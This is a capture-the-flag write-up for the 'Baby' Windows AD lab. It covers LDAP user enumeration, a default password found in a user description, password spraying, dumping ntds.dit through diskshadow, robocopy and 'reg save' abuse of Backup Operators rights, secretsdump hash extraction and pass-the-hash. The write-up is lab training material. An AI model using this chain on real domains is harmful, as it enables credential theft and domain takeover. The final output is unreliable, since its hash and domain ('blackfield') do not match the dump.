
**BABY** was an easy-rated Windows AD machine that involved enumerating users and their default passwords from their descriptions for initial access. The exploitation of **SeBackupPrivilege** permission was used to dump the **NTDS.dit** file to access the DC.

<img alt="abc"  alt="abc"  src="https://i.imgur.com/4VM62PT.png">

# User

## Scanning through Nmap

First, we'll use Nmap to scan the whole network and find out what services are running. With the **-p-** option, we can check all **65535** ports, and by adding **--min-rate 10000**, we can make the scan faster. After running Nmap, we'll have a list of open ports on the network, and we'll use tools like **cut** and **tr** to filter out only the open ones.

```shell
$ nmap -p- --min-rate 10000 10.10.127.19 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
53,135,139,389,445,464,593,3269,3389,5985,49664,49667,49674,57611
```

Now let's run a detailed scan on these specific ports using...

```bash
$ nmap -p53,135,139,445,464,593,3269,3389,5985,49664,49667,49674,57611 -sC -sV -A -T4 10.10.127.19 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active                                   Directory LDAP (Domain:                                    baby.vl0., Site: Default-                                  First-Site-Name) 
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-10-12T17:26:59+00:00
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2024-07-26T09:03:15
|_Not valid after:  2025-01-25T09:03:15
|_ssl-date: 2024-10-12T17:27:39+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57611/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Information Gathering

Through **Nmap** we found port **53 DNS** is open which can be used to perform zone transfer, **139 & 445 SMB** ports are open and can be used to enumerate shares with anonymous user for initial access, **389 ldap** port is open. Nmap discover Domain name by using **ldap** scripts which is **baby.vl** and Fully Qualified Domain Name FQDN as **babydc.baby.vl** . Let's add this to our local DNS file called `/etc/hosts` so that our computer can resolve domain.

```bash
$ echo "10.10.127.19 baby.vl babydc.baby.vl" | sudo tee -a /etc/hosts
10.10.127.19 baby.vl babydc.baby.vl
```


### User Enumeration using LDAP

LDAP Anonymous access was allowed, though which we were able to discover usernames.

<img alt="abc"  alt="abc"  src="https://i.imgur.com/Z0tE1ks.png">

I tried **AsReproasting** but failed, then I decided to check the user's description, because most of the time their default passwords are present in it.
To find the user's description, we will use **nxc** with module `get-desc-users`. From there we found the initial password for **Teresa.Bell**  as `BabyStart123!`

<img alt="abc"  alt="abc"  src="https://i.imgur.com/MvuyyPv.png">

After performing password spray using **nxc**, I discover that the password was set against the user `caroline.robinson` but now it is expired.

<img alt="abc"  alt="abc"  src="https://i.imgur.com/C9BbdV8.png">

Now we need to change the expired password for this user, we will use **kpasswd**.

### Changing the expired password

 **kpasswd** (binary inside krb5-user or heimdal) can be used to change the users and computer password, but it requires you to do some configuration and possibly edit your host file. In my lab, I installed the krb5-user using apt install and configured it by editing the `/etc/krb5.conf` file. The file for my lab looks like this:

```bash
[libdefaults]
        default_realm = BABY.VL
        dns_lookup_realm = false
        ticket_lifetime = 24h
        renew_lifetime = 7d
        rdns = false
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
[realms]
        BABY.VL = {
                kdc = BABYDC.BABY.VL
                admin_server = BABYDC.BABY.VL          }
```

Then run the following command

```bash
$ kpasswd <user-name>
```

<img alt="abc"  alt="abc"  src="https://i.imgur.com/NItnq8A.png">

After that we verified that the user `caroline.robinson` is a member of **Remote Management Group** using **nxc**.

<img alt="abc"  alt="abc"  src="https://i.imgur.com/f1uFjF2.png">

### WinRM 5985

Windows Remote Management (WinRM) is a protocol developed by Microsoft, enabling administrators to **manage and control Windows-based systems remotely** Evil-winrm is a tool which use **WinRM** service to get remote shell on the box.

<img alt="abc"  alt="abc"  src="https://i.imgur.com/etMtrMR.png">

# Privilege Escalation

Let's check what permissions we have on domain.

<img alt="abc"  alt="abc"  src="https://i.imgur.com/Qmob5Rg.png">

<img alt="abc"  alt="abc"  src="https://i.imgur.com/ybZJjRy.png">

And we are member of **Backup Operators** group in domain.

#### What is Backup Operators group?

 **Backup Operators** group is an historical Windows built in group. Backup operator groups allows users to take the **backup** and **restore** files regardless whether they have **access** to the files or not.
 Privileges of backup Operators
- Can recover and back up files.
- Can create a system backup.
- Able to recover system state. (Only Windows® XP and 2003). To restore system state on Windows Vista, 7, 8, 8.1, 2008, or 10, you must also be a member of the Administrators group.
- The TSM Scheduler service can be started

## Exploitation

There are multiple ways to exploit **SeBackupPrivileges** permissions. [refrence](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)

### Diskshadow & Robocopy 

Diskshadow and Robocopy are both windows buil-in utilities. **Diskshadow** creates copies of a currently used drive because we cannot create a copy of running system files, while **Robocopy** copies files and directories from one location to another.

Let's Create a script which will create a full backup of `C:\`  and exposes it as a network drive with the drive letter `E:\`.

```bash
$ cat backup.txt 
set verbose on 
set metadata C:\Windows\Temp\meta.cab 
set context clientaccessible 
set context persistent 
begin backup 
add volume C: alias cdrive 
create 
expose %cdrive% E: 
end backup 
```

- `set verbose on` to enable verbosity
- `set metadata C:\Windows\Temp\meta.cab` Location of metadata
- `set context clientaccessible` to make backup accessible to us
- `set context persistent` making it persistent so that we never lost it after the re-boot
- `begin backup` initiates backup process
- `add volume C: alias cdrive` includes the `C:\` drive, and assigns it an alias such as **cdrive** for reference
- `create` create a backup
- `expose %cdrive% E:` expose alias **cdrive** as a network drive
- `end backup` to finalize the backup
 
Now upload the backup script to victim machine using **upload** feature of evil-winrm.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> upload backup.txt
```

Now create a **shadow copy** using diskshadow utility.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> diskshadow /s backup.txt
```

- `/s` for script file path

<img alt="abc"  alt="abc"  src="https://i.imgur.com/LJJ9lP2.png">

When shadow copy created successfully. Now we have to extract **ntds.dit** file from the network drive. For this we will use **robocopy** utility.
```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> robocopy /b E:\Windows\ntds . ntds.dit
``` 

- `/b` for source file path.

<img alt="abc"  alt="abc"  src="https://i.imgur.com/hXMg3Hr.png">

We extract the ntds.dit file sccessfully, now we need a decryption key to decrypt the ntds.dit file extract the password hashes form it. we will use `reg save` command for that
```powershell 
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> reg save hklm\system system.bak
```

Now we have both **ntds.dit** file and the decryption key used to decrypt it. Let's download it to our local attacking machine using download functionality of evilwinrm.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> download ntds.dit
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> download system.bak
```

<img alt="abc"  alt="abc"  src="https://i.imgur.com/kxjBkQq.png">

#### Secretsdump.py 

**SecretsDump.py** is a Python tool by Impacket that can extract secrets from targets. **SecretsDump.py** performs various techniques to dump hashes from the remote machine without executing any agent there. For **SAM** and **LSA** Secrets (including cached creds) it tries to read as much as it can from the **registry** and then saves the hives in the target system `(%SYSTEMROOT%\Temp dir)` and reads the rest of the data from there. For **NTDS.dit** it uses the **Volume Shadow Copy Service** to read **NTDS.dit** directly from the disk or it can use the parser module to read NTDS.dit files from a copy.

```bash
$ ecretsdump.py -ntds ntds.dit -system system.bak -hashes lmhash:nthash LOCAL
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e34532cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:819314344a7420f304b924c18936f2a6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:d731082cb6c86fb2f3d64a9439e60dc7:::
```

Now we have the hashes of different user's and Administrator. We can bruteforce them offline to extract the plain text password or can also perform **pass-the-hash** attack to gain remote shell on user account

###  Pass-The-Hash

**pass the hash** is a hacking technique that allows an attacker to authenticate to a remote server or service by using the underlying **NTLM** or **LanMan** hash of a user's password, instead of requiring the associated plaintext password as is normally the case. It replaces the need for stealing the plaintext password to gain access with stealing the hash. This happens due to **NTLM** protocol, used in AD to authenticate users. [reference](https://en.wikipedia.org/wiki/NTLM)

We can perform **pass-the-hash** attack using different tools like `evil-winrm`, `psexec.py` and `wmiexec.py`

#### Evil-wirnm

Using Evil-winrm.

```powershell
$ evil-winrm -i 10.10.127.19 -u administrator -H 'ee4457ae59f1e3fbd764567d9cef123d' 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami 
blackfield\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

# Happy Hacking ❤

# Reference

- https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
